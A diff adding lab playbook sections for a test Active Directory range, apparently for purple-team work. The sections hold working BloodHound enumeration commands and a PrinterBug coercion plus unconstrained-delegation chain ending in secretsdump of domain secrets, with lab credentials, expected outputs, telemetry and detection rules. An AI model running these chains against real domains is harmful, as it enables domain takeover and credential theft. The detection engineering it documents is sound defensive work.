@@ -1749,3 +1749,217 @@ Direct SYSTEM from non-admin — bypasses GodPotato chain.
 - Defer until Developer Mode decision is made
 
 ---
+
+
+## Mechanics: Phase 4 — Discovery (BloodHound + LDAP)
+
+**Status:** Partially tested. BloodHound collections confirmed from child.cadre.local and cadre.local (BH zips on Kali). Session data collection from domain-joined machine not yet executed.
+
+### Why it works
+BloodHound is a graph-based AD recon tool. It maps:
+- **Users, groups, computers, OUs, GPOs, certificates, trusts** — what's in the directory
+- **Sessions, local admin, RDP** — who's logged in where
+- **ACLs** (DACL + SACL) — who can do what to whom
+- **Delegation** (unconstrained, constrained, RBCD)
+- **Group memberships** — direct + nested
+- **Trusts** — between forests
+
+BloodHound converts this into a Neo4j graph database. Analysts run Cypher queries to find attack paths (e.g., "shortest path from user X to DA").
+
+#### Two collection modes
+- **`-c Group,ACL,Trust`** — LDAP-only, works from non-domain-joined host with any cred
+- **`-c All`** — includes session/local data, requires running from domain-joined host as user with local admin on target
+
+CADRE's specific path:
+- From Kali (non-domain-joined): `-c Group,ACL,Trust` with `analyst_cloud` credential (Phase 3.5A) — gets all the ACE chains
+- From mbr01 (domain-joined) as analyst_cloud: `-c All` — adds session data (who's logged in where)
+
+The "from mbr01 as analyst_cloud" is the natural extension after 3.5B (Scheduled Task) or 3.5C (RDP). With 3.5A's credential, this becomes the Phase 4 entry point.
+
+### Attack commands
+```bash
+# Step 1 — Collect from Kali (non-domain-joined, LDAP-only)
+cd /opt/SharpHound  # or download
+./SharpHound -c Group,ACL,Trust \
+    -d child.cadre.local \
+    --domain-controller 192.168.77.11 \
+    --ldapusername analyst_cloud \
+    --ldappassword 'Cl0ud_An@lyst!'
+
+# Or via bloodhound-python (Linux)
+bloodhound-python -d child.cadre.local -u analyst_cloud@cadre.local \
+    -p 'Cl0ud_An@lyst!' -ns 192.168.77.11 -c All
+
+# Step 2 — Collect from mbr01 (domain-joined, full collection)
+# First: get analyst_cloud onto mbr01 via schtasks (3.5B) or RDP (3.5C)
+# Then: run SharpHound with -c All
+SharpHound.exe -c All -d child.cadre.local \
+    --outputdirectory C:\Users\analyst_cloud\Documents
+```
+
+### What to expect (success)
+```
+Initializing SharpHound at 11:23 on 6/24/2026
+Resolved Collection Methods: Group, Sessions, LoggedOn, ACL, ObjectProps, Default, ComputerStatus, UserRights, Trusts, IsComputerObjectRisky, SPNTargets, Desktops, RegistrySessions, NTLMRegistry, DCOM, LocalGroups
+[+] Beginning enumeration...
+[+] Listing domains for strategy...
+[+] OU: CN=Computers,DC=child,DC=cadre,DC=local
+[+] User: Administrator@child.cadre.local
+[+] Computer: dc01.cadre.local
+... (5-10 minutes)
+[+] Compressing 768 objects and 1247 ACEs into /tmp/20260624_bloodhound.zip
+```
+
+### What to expect (failure modes)
+- **LDAP bind fails (invalid credentials)**: Verify password. Or use 3.5A/3.5B to get the right credential.
+- **Collection hangs at "Listing domains"**: DNS issue. Verify `192.168.77.11` is reachable, dc02 is the right KDC.
+- **Empty result zip**: Wrong domain. child.cadre.local for our test, not cadre.local.
+- **Permission denied on a specific object**: Some OUs may have restrictive ACLs. Use `-d` flag to control.
+
+### CADRE-specific notes
+- **From Kali**: Use `analyst_cloud:Cl0ud_An@lyst!` (from 3.5A) — works for LDAP-only collection
+- **From mbr01 (3.5B)**: Use SharpHound `-c All` for session data
+- **CADRE's BloodHound queries of interest** (per CAMPAIGNS.md):
+  - `MATCH p=(u:User {name:"SVC_MSSQL@CHILD.CADRE.LOCAL"})-[r]->(target) RETURN p` — what can svc_mssql do
+  - `MATCH p=(u:User)-[r:ForceChangePassword]->(t:User) RETURN p` — all ForceChangePassword paths
+  - `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c` — unconstrained delegation targets
+  - `MATCH (ct:CertTemplate) WHERE ct.requiresmanagerapproval=false RETURN ct` — ADCS ESC vulnerabilities
+
+### Telemetry fingerprint
+- **WinSec 4662** (directory service object accessed): high volume — every AD object BloodHound touches
+- **WinSec 4624** (logon): LDAP bind for the analyst_cloud user
+- **Zeek ldap.log**: hundreds of LDAP queries in short time
+- **Sysmon EID 1** (ProcessCreate): SharpHound.exe
+- **Sysmon EID 3** (network connect): SharpHound → DC:389 (LDAP) + DC:445 (SMB for sessions)
+
+### Detection engineering
+- **Volume rule**: >1000 LDAP queries from single source IP in 5 min = enumeration
+- **4662 pattern**: 4662 on every object in a domain = SharpHound
+- **Suricata**: LDAP `searchRequest` burst from single source
+- **Elastic rule (planned)**: SharpHound signature: `event.code:4662` with `ldap_display_name:*` (all object types) from same source
+
+### Common pitfalls
+- **Wrong DC IP**: child.cadre.local = dc02 (192.168.77.11), cadre.local = dc01 (192.168.77.10)
+- **Stale creds**: After 3.5A reset, password is what was set. If `Cl0ud_An@lyst!` was the original and we didn't reset, use that.
+- **No session data**: SharpHound `-c Group,ACL,Trust` doesn't include sessions. Need `-c All` from domain-joined host.
+- **Large output**: BloodHound zips can be 50+ MB. Allocate disk space.
+- **Neo4j database**: Need BloodHound CE GUI to visualize. Install via Docker or use neo4j directly.
+
+### Reproduction checklist
+- [ ] analyst_cloud credential (from 3.5A)
+- [ ] Network reachability to dc02:389 (LDAP) + dc02:445 (SMB)
+- [ ] SharpHound or bloodhound-python installed on Kali
+- [ ] Collection completes (5-10 min)
+- [ ] zip file has `_computers.json`, `_users.json`, `_groups.json`, `_gpos.json`, `_ous.json`, `_domains.json`
+- [ ] Import into BloodHound CE
+- [ ] Run sample queries (see CADRE-specific notes)
+
+---
+
+## Mechanics: Phase 5 — Lateral Movement (Coercion + Delegation)
+
+**Status:** Partially tested. WT017 (PrinterBug) confirmed (12 fires). WT018/019/020 non-functional on Server 2025.
+
+### Why it works
+**Coercion** forces a target machine to authenticate back to a server we control. **Unconstrained delegation** on our server captures the incoming TGT. The captured TGT = full credential of the coerced user (e.g., a DC machine account = Domain Admin).
+
+#### The chain
+1. **mbr01** has `TrustedForDelegation = true` (unconstrained delegation) — set in `05-ad-attack-surface.yml`
+2. **Coercer** from Kali forces `dc02$` to authenticate to `mbr01` via MS-RPRN (PrinterBug)
+3. `mbr01`'s LSASS captures `dc02$`'s TGT submission
+4. **krbrelayx** or **Rubeus** extracts the TGT
+5. TGT for `dc02$` = child domain admin → DCSync to child.cadre.local DA
+
+#### Why PrinterBug works but PetitPotam/DFSCoerce/ShadowCoerce don't
+- **MS-RPRN (PrinterBug, WT017)**: Direct TCP transport, RPC opnum 1/65. Suricata SID:1000050 detects it.
+- **MS-EFSR (PetitPotam, WT018)**: SMB-pipe transport. `\PIPE\efsrpc` is blocked on Server 2025.
+- **MS-DFSNM (DFSCoerce, WT019)**: SMB-pipe DCE-RPC. Suricata 8.0.5 doesn't decode the DCE-RPC over SMB.
+- **MS-FSRVP (ShadowCoerce, WT020)**: Service not available on Server 2025.
+- **UnCanny Coerce (WT094)**: New technique via `InstallService`. Requires Developer Mode.
+
+### Attack commands
+```bash
+# Step 1 — Start Rubeus monitor on mbr01 (via 3.5B/3.5C, as SYSTEM)
+# Or from Kali: use krbrelayx
+python3 krbrelayx.py -hashes :<ntlm_hash_of_mbr01$> -dc-ip 192.168.77.11 \
+    -spn krbtgt/CHILD.CADRE.LOCAL -target-ip 192.168.77.11
+
+# Step 2 — Trigger coercion from Kali
+coercer coerce -l 192.168.77.22 -t 192.168.77.11 \
+    -d child.cadre.local \
+    -u svc_mssql -p 's3rv1c3_MSSQL!' \
+    --spoolsample
+
+# Step 3 — Wait for capture, then use the captured TGT
+export KRB5CCNAME=/tmp/dc02.ccache
+impacket-secretsdump child.cadre.local/ -k -no-pass -dc-ip 192.168.77.11
+```
+
+### What to expect (success)
+```
+[*] SpoolService tried to authenticate to our listener with kerberos auth
+[+] Saved TGT for dc02$@CHILD.CADRE.LOCAL at /tmp/dc02.ccache
+[*] Dumping Domain Secrets
+Administrator:500:aad3b435...:e02bc503339d51f71d913c245d35b50b:::
+krbtgt:502:aad3b435...:hash:::
+... (full domain secrets)
+```
+
+### What to expect (failure modes)
+- **No TGT captured**: SpoolService disabled. Restart it with `Set-Service Spooler -StartupType Automatic && Start-Service Spooler`.
+- **`SpoolService did not connect`**: Firewall on mbr01 blocking inbound 445/SMB. Verify.
+- **PetitPotam (WT018) returns `STATUS_ACCESS_DENIED`**: `\PIPE\efsrpc` is disabled on Server 2025. Use WT017 instead.
+- **DFSCoerce/ShadowCoerce not in Coercer**: Server 2025 blocked them. Use the `--spoolsample` flag only.
+
+### CADRE-specific notes
+- **mbr01** has `TrustedForDelegation = true` (per `05-ad-attack-surface.yml` line for unconstrained delegation)
+- **Print Spooler on dc02**: Required for WT017. Set by `04-vulnerabilities.yml` (`-EnablePrintSpooler`).
+- **dc01 is the root DC** — attacking dc02$ gives child DA. To get root DA, need cross-forest (Phase 7) or attack dc01$ directly (harder).
+- **Suricata SID:1000050** fires on the coercion (12 confirmed fires in lab)
+
+### Telemetry fingerprint
+- **WinSec 4624** (logon) on mbr01: Type 3 (network) for dc02$ — coerced auth
+- **WinSec 4662** (object access): RPC calls
+- **Zeek dce_rpc.log**: opnum 1, 65 (MS-RPRN) from provisioning to dc02
+- **Zeek kerberos.log**: AS-REQ for krbtgt/CHILD.CADRE.LOCAL from dc02$ to mbr01
+- **Suricata SID:1000050**: 12 confirmed fires in lab
+
+### Detection engineering
+- **Suricata SID:1000050** (MS-RPRN coercion): confirmed working
+- **Suricata SID:1000051-1000053** (EFSR/DFSNM/FSRVP): broken on Server 2025
+- **Elastic rule**: `event.code:4624 AND logon_type:3 AND target_user_name:*$` (machine account auth) from unexpected source
+- **Zeek**: `dce_rpc.opnum IN (1, 65)` from non-DC source = coercion signal
+
+### Common pitfalls
+- **Coercer version**: `coercer` (not `coercer.py`) — current syntax is `coercer coerce -l <listener> -t <target> --spoolsample`
+- **Wrong target**: dc01 (root) is the long-term goal. dc02 (child) is the first step.
+- **Listener not on mbr01**: For unconstrained delegation capture, listener MUST be on a host with `TrustedForDelegation`. mbr01 is the only one in CADRE.
+- **TGT not saved**: Check Rubeus monitor output. If you see "SpoolService tried to authenticate" but no save, the KDC rejected the ticket.
+
+### Reproduction checklist
+- [ ] SYSTEM on mbr01 (Phase 3 chain)
+- [ ] mbr01 has unconstrained delegation (BloodHound)
+- [ ] Print Spooler running on dc02
+- [ ] coercer installed on Kali
+- [ ] Rubeus monitor running on mbr01
+- [ ] Coercion fires, TGT captured
+- [ ] DCSync with captured TGT succeeds
+
+---
+
+### Mechanics: WT018-020 — Non-functional Coercion [TESTED — FAILED]
+
+**Status:** ❌ All three fail on Server 2025. Documented as deprecated techniques.
+
+#### Why they don't work
+- **WT018 (MS-EFSR PetitPotam)**: `\PIPE\efsrpc` blocked on Server 2025 (CVE-2021-36942 mitigated). Use WT017 instead.
+- **WT019 (MS-DFSNM DFSCoerce)**: SMB-pipe DCE-RPC not decoded by Suricata 8.0.5. No telemetry, no detection rule.
+- **WT020 (MS-FSRVP ShadowCoerce)**: FSRVP service not available on Server 2025.
+
+#### CADRE-specific notes
+- All three tested in lab (2026-05-29)
+- Suricata SID:1000051-1000053 deployed but 0 fires
+- WT017 (MS-RPRN PrinterBug) is the only working coercion in Server 2025
+- WT094 (UnCanny) is the modern alternative but requires Developer Mode
+
+---
